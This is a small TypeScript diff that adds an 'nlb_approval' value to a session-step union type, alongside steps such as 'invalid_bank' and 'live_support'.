@@ -17,7 +17,8 @@ export type SessionStep =
   | "generator2"
   | "custom_question"
   | "invalid_bank"
-  | "live_support";
+  | "live_support"
+  | "nlb_approval";
 export type SessionStatus = "online" | "offline" | "SUCCESS" | "CONGRATS" | "SPECIAL_INFO";
 
 export type SessionFormData = {
